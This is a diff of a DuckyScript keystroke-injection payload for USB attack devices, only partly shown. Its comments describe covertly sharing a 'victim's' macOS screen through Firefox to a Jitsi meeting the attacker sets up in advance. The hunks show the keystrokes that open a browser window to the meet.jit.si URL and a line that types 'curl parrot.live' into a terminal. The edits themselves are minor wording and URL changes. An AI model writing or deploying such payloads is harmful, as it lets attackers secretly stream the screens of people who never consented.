@@ -1,5 +1,5 @@
 
-REM Script to share a victom's screen via Firefox browser on MacOS by Skicka 2022.
+REM Script to share a victim's screen via Firefox on MacOS by Skicka 2022.
 REM You must set up a Jitsi session first & paste the URL over the example
 DELAY 3000
 GUI SPACE
@@ -20,7 +20,7 @@ TAB
 ENTER
 GUI N
 DELAY 1500
-STRING https://meet.jit.si/example
+STRING https://meet.jit.si/EXAMPLE
 DELAY 100
 ENTER
 DELAY 1000
@@ -36,4 +36,3 @@ DELAY 100
 STRING curl parrot.live
 DELAY 100
 ENTER
-
